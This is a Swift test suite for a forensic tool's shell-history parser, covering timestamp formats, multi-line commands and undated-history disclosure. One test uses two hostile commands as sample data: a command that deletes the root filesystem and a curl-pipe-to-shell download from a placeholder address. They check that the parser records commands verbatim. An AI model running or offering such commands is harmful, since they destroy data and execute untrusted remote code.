//
//  ShellHistoryParserTests.swift
//  KalsmritikoshTests
//
//  HOST-4b — shell / REPL history.
//
//  The commands already parsed as text before this unit, so what is really
//  being tested is the TIME: that each flavour's timestamp syntax is decoded,
//  that a multi-line command is not truncated at its first newline, and — the
//  one that protects an answer — that an UNDATED history says so instead of
//  looking like a dated one whose dates went missing.
//

import Foundation
import Testing
@testable import Kalsmritikosh

@Suite("Shell history (HOST-4b)")
struct ShellHistoryParserTests {

    private let parser = ShellHistoryStructuralParser()

    private func date(_ iso: String) -> Date {
        let f = ISO8601DateFormatter()
        f.timeZone = TimeZone(secondsFromGMT: 0)
        return f.date(from: iso)!
    }

    private func parse(_ text: String, as filename: String = ".bash_history")
    async throws -> ParsedDocument {
        try await parser.parse(data: Data(text.utf8), filename: filename, type: .shellHistory,
                               logicalSourceID: UUID(), sourceVersionID: UUID())
    }

    private func commandBlocks(_ doc: ParsedDocument) -> [EvidenceBlock] {
        doc.blocks.filter { $0.kind == .logRecord }
    }
    private func stringAttribute(_ block: EvidenceBlock, _ key: String) -> String? {
        if case .string(let value) = block.attributes[key]?.value { return value }
        return nil
    }
    private func intAttribute(_ block: EvidenceBlock, _ key: String) -> Int64? {
        if case .int(let value) = block.attributes[key]?.value { return value }
        return nil
    }

    // MARK: - bash with HISTTIMEFORMAT

    @Test("A bash history with HISTTIMEFORMAT dates every command")
    func bashTimestamped() async throws {
        let doc = try await parse("""
        #1773480413
        cd /var/log
        #1773480460
        sudo tail -f auth.log
        """)
        let commands = commandBlocks(doc)
        #expect(commands.count == 2)
        #expect(stringAttribute(commands[0], "command") == "cd /var/log")
        #expect(stringAttribute(commands[0], "timestamp") == "2026-03-14T09:26:53Z")
        #expect(stringAttribute(commands[1], "command") == "sudo tail -f auth.log")
        #expect(stringAttribute(commands[1], "timestamp") == "2026-03-14T09:27:40Z")
    }

    @Test("A typed comment is not mistaken for a timestamp")
    func typedCommentIsNotATimestamp() async throws {
        // `# deploy the thing` and `#42` are things people type. Reading either
        // as a date would invent a time and swallow the line that followed.
        let doc = try await parse("""
        # deploy the thing
        #42
        ls
        """)
        let commands = commandBlocks(doc)
        let texts = commands.compactMap { stringAttribute($0, "command") }
        #expect(texts == ["# deploy the thing", "#42", "ls"])
        #expect(commands.allSatisfy { stringAttribute($0, "timestamp") == nil })
    }

    @Test("Undated lines BEFORE the first timestamp stay separate commands")
    func undatedRegionIsNotFusedIntoOneCommand() async throws {
        // The normal shape of a real file: HISTTIMEFORMAT was switched on
        // part-way through its life. bash marks every DATED command, so unmarked
        // lines after a marker continue a multi-line command — but applying that
        // rule to the undated region at the top would fuse a whole history into
        // one command nobody ran.
        let doc = try await parse("""
        cd /var/log
        grep -c ERROR syslog
        exit
        #1773480413
        for f in *; do
          echo "$f"
        done
        """)
        let commands = commandBlocks(doc)
        #expect(commands.count == 4)
        #expect(stringAttribute(commands[0], "command") == "cd /var/log")
        #expect(stringAttribute(commands[1], "command") == "grep -c ERROR syslog")
        #expect(stringAttribute(commands[2], "command") == "exit")
        #expect(commands[0...2].allSatisfy { stringAttribute($0, "timestamp") == nil })
        // And the dated multi-line command after the marker IS joined.
        #expect(try #require(stringAttribute(commands[3], "command")).contains("echo \"$f\""))
        #expect(stringAttribute(commands[3], "timestamp") != nil)
    }

    @Test("A multi-line bash command is kept whole")
    func bashMultiLineCommand() async throws {
        // bash writes the newlines literally. Cutting at the first one would
        // report a command that was never run.
        let doc = try await parse("""
        #1773480413
        for f in *.log; do
          grep -c ERROR "$f"
        done
        #1773480500
        exit
        """)
        let commands = commandBlocks(doc)
        #expect(commands.count == 2)
        let first = try #require(stringAttribute(commands[0], "command"))
        #expect(first.contains("for f in *.log; do"))
        #expect(first.contains("grep -c ERROR"))
        #expect(first.contains("done"))
        #expect(stringAttribute(commands[1], "command") == "exit")
    }

    // MARK: - zsh EXTENDED_HISTORY

    @Test("A zsh extended history decodes the time AND how long the command ran")
    func zshExtended() async throws {
        let doc = try await parse("""
        : 1773480413:0;cd /tmp
        : 1773480460:127;./collect.sh --all
        """, as: ".zsh_history")
        let commands = commandBlocks(doc)
        #expect(commands.count == 2)
        #expect(stringAttribute(commands[0], "command") == "cd /tmp")
        #expect(stringAttribute(commands[1], "command") == "./collect.sh --all")
        #expect(stringAttribute(commands[1], "timestamp") == "2026-03-14T09:27:40Z")
        // How long it ran is a fact the shell recorded and nothing else states.
        #expect(intAttribute(commands[1], "elapsedSeconds") == 127)
        #expect(commands[1].rawText.contains("took 127s"))
    }

    @Test("A zsh command containing a semicolon keeps all of it")
    func zshSemicolonInCommand() async throws {
        // The prefix ends at the FIRST semicolon; every later one belongs to the
        // command. Splitting on the last would truncate it.
        let doc = try await parse(": 1773480413:2;cd /tmp; rm -rf ./cache; echo done",
                                  as: ".zsh_history")
        let command = try #require(commandBlocks(doc).first)
        #expect(stringAttribute(command, "command") == "cd /tmp; rm -rf ./cache; echo done")
    }

    @Test("A zsh multi-line command is kept whole")
    func zshMultiLineCommand() async throws {
        let doc = try await parse("""
        : 1773480413:0;for f in *; do
          echo "$f"
        done
        : 1773480500:0;exit
        """, as: ".zsh_history")
        let commands = commandBlocks(doc)
        #expect(commands.count == 2)
        #expect(try #require(stringAttribute(commands[0], "command")).contains("echo \"$f\""))
        #expect(stringAttribute(commands[1], "command") == "exit")
    }

    // MARK: - fish

    @Test("A fish history decodes its cmd/when blocks")
    func fishHistory() async throws {
        let doc = try await parse("""
        - cmd: ssh riyaz@10.0.4.91
          when: 1773480413
        - cmd: scp report.pdf riyaz@10.0.4.91:/tmp
          when: 1773480460
          paths:
            - report.pdf
        """, as: "fish_history")
        let commands = commandBlocks(doc)
        #expect(commands.count == 2)
        #expect(stringAttribute(commands[0], "command") == "ssh riyaz@10.0.4.91")
        #expect(stringAttribute(commands[1], "command") == "scp report.pdf riyaz@10.0.4.91:/tmp")
        #expect(stringAttribute(commands[1], "timestamp") == "2026-03-14T09:27:40Z")
        // `paths:` is fish's bookkeeping, not a command someone ran.
        #expect(!commands.contains { stringAttribute($0, "command")?.contains("paths") == true })
        #expect(!commands.contains { stringAttribute($0, "command") == "report.pdf" })
    }

    // MARK: - THE undated disclosure

    @Test("An undated history SAYS it is undated, in the evidence")
    func undatedHistoryDisclosesIt() async throws {
        // Without this, a bare history looks exactly like a dated one whose
        // dates failed to display, and an answer could place these commands at
        // a time the file never recorded.
        let doc = try await parse("""
        cd /var/log
        sudo tail -f auth.log
        exit
        """)
        let disclosure = try #require(doc.blocks.first {
            stringAttribute($0, "limitation") == "no-command-timestamps"
        })
        #expect(disclosure.rawText.contains("NO timestamps"))
        #expect(disclosure.rawText.contains("ORDER"))
        #expect(disclosure.rawText.contains("HISTTIMEFORMAT"))

        let commands = commandBlocks(doc)
        #expect(commands.count == 3)
        #expect(commands.allSatisfy { stringAttribute($0, "timestamp") == nil })
        // Order IS the evidence, so the sequence has to be right and contiguous.
        #expect(commands.compactMap { intAttribute($0, "sequence") } == [1, 2, 3])
        #expect(commands.allSatisfy { $0.rawText.contains("no time recorded") })
    }

    @Test("A partially dated history reports which half is undated")
    func partiallyDatedHistory() async throws {
        // Real files look like this: timestamping was switched on part-way
        // through. Both halves are genuine and the difference matters.
        let doc = try await parse("""
        cd /var/log
        : 1773480413:0;sudo tail -f auth.log
        """, as: ".zsh_history")
        let commands = commandBlocks(doc)
        #expect(commands.count == 2)
        #expect(stringAttribute(commands[0], "timestamp") == nil)
        #expect(stringAttribute(commands[1], "timestamp") != nil)
        #expect(doc.warnings.contains { $0.code == "shellhistory.partially_dated" })
        // And it is NOT labelled undated — the flavour is what the file is.
        #expect(!doc.blocks.contains { stringAttribute($0, "limitation") == "no-command-timestamps" })
    }

    @Test("A backslash continuation in a bare history is one command")
    func bareContinuation() async throws {
        let doc = try await parse("""
        tar -czf backup.tgz \\
          /home/riyaz/case
        exit
        """)
        let commands = commandBlocks(doc)
        #expect(commands.count == 2)
        #expect(try #require(stringAttribute(commands[0], "command")).contains("/home/riyaz/case"))
        #expect(stringAttribute(commands[1], "command") == "exit")
    }

    // MARK: - What it must NOT do

    @Test("Repeated commands are NOT de-duplicated")
    func repetitionIsPreserved() async throws {
        // Running the same command forty times is a fact about what someone was
        // doing; collapsing it would erase that.
        let doc = try await parse("""
        sudo -i
        sudo -i
        sudo -i
        """)
        #expect(commandBlocks(doc).count == 3)
    }

    @Test("Commands are never labelled suspicious")
    func noEditorialising() async throws {
        // Classification is analysis, and a wrong label sitting beside real
        // evidence reads as if the file had said it.
        let doc = try await parse("""
        #1773480413
        rm -rf / --no-preserve-root
        #1773480460
        curl http://203.0.113.9/x.sh | sh
        """)
        let body = doc.blocks.map(\.rawText).joined(separator: "\n").lowercased()
        for word in ["suspicious", "malicious", "dangerous", "attack", "warning:"] {
            #expect(!body.contains(word), "the parser editorialised: \(word)")
        }
        // The commands themselves are recorded exactly.
        #expect(body.contains("rm -rf / --no-preserve-root"))
        #expect(body.contains("curl http://203.0.113.9/x.sh | sh"))
    }

    // MARK: - Honest states

    @Test("The header states the count, flavour and time span")
    func headerSummarises() async throws {
        let doc = try await parse("""
        : 1773480413:0;cd /tmp
        : 1773480460:0;exit
        """, as: ".zsh_history")
        let header = try #require(doc.blocks.first { $0.kind == .documentHeader })
        #expect(header.rawText.contains("2 command(s)"))
        #expect(header.rawText.contains("EXTENDED_HISTORY"))
        #expect(header.rawText.contains("2026-03-14T09:26:53Z"))
    }

    @Test("An empty file is empty, and a whitespace-only file holds no commands")
    func emptyStates() async throws {
        let empty = try await parse("")
        #expect(empty.extractionStatus == .empty)
        let blank = try await parse("\n\n   \n")
        #expect(blank.extractionStatus == .empty)
        #expect(blank.warnings.contains { $0.code == "shellhistory.no_commands" })
    }

    @Test("Bytes that are not valid UTF-8 are read anyway, and the encoding is disclosed")
    func nonUTF8IsDisclosed() async throws {
        // zsh writes its own escaped encoding for non-ASCII. Guessing at an
        // unescaping could corrupt a command, so every byte is kept readable and
        // the limitation is stated.
        var bytes = Array("#1773480413\nls ".utf8)
        bytes += [0x83, 0xE9, 0x0A]      // not valid UTF-8
        let doc = try await parser.parse(
            data: Data(bytes), filename: ".zsh_history", type: .shellHistory,
            logicalSourceID: UUID(), sourceVersionID: UUID())
        #expect(doc.extractionStatus == .complete)
        #expect(doc.warnings.contains { $0.code == "shellhistory.not_utf8" })
        #expect(commandBlocks(doc).count == 1)
    }

    @Test("Parsing is deterministic")
    func deterministic() async throws {
        let text = """
        : 1773480413:0;cd /tmp
        : 1773480460:5;./run.sh
        """
        let first = try await parse(text, as: ".zsh_history").blocks.map(\.rawText)
        let second = try await parse(text, as: ".zsh_history").blocks.map(\.rawText)
        #expect(first == second)
    }

    // MARK: - Routing

    @Test("History files are detected by their exact names")
    func detection() {
        #expect(SourceType.detect(from: URL(fileURLWithPath: "/home/r/.bash_history")) == .shellHistory)
        #expect(SourceType.detect(from: URL(fileURLWithPath: "/home/r/.zsh_history")) == .shellHistory)
        #expect(SourceType.detect(from: URL(fileURLWithPath: "/home/r/.python_history")) == .shellHistory)
        #expect(SourceType.detect(
            from: URL(fileURLWithPath: "/home/r/.local/share/fish/fish_history")) == .shellHistory)
        // The dot is routinely lost when evidence is copied out.
        #expect(SourceType.detect(from: URL(fileURLWithPath: "/case/bash_history")) == .shellHistory)
        #expect(SourceType.shellHistory.category == .hostArtifact)
    }

    @Test("Names that are NOT command history keep their own lanes")
    func neighbouringNamesAreNotClaimed() {
        // Chrome's profile DB is literally named `History`, and claiming it here
        // would break the browser lane.
        #expect(SourceType.detect(
            from: URL(fileURLWithPath: "/u/.config/google/chrome/Default/History")) == .chromeHistory)
        // A text export ABOUT a history is a document, not the artifact.
        #expect(SourceType.detect(from: URL(fileURLWithPath: "/case/bash_history.txt")) == .txt)
        // Editor/pager state is not a command log.
        #expect(SourceType.detect(from: URL(fileURLWithPath: "/home/r/.lesshst")) == .unknown)
        #expect(SourceType.detect(from: URL(fileURLWithPath: "/home/r/.viminfo")) == .unknown)
    }

    @Test("The registry gives .shellHistory a real immediate plugin with structure")
    @MainActor
    func registryOwnsIt() throws {
        // No dedicated loader: the bytes are text, so the TextLoader fallback
        // reads them and this parser supplies the structure — the same path
        // html/json/xml/log take.
        let registry = try UniversalParserRegistryBuilder.standard(ocr: VisionOCR())
        let plugin = try registry.resolve(.shellHistory)
        #expect(plugin.pluginID == "format.shellHistory")
        #expect(plugin.executionMode == .immediate)
        #expect(plugin.capabilities.producesStructure)
        #expect(!(plugin is PreservedOnlyPlugin))
    }
}
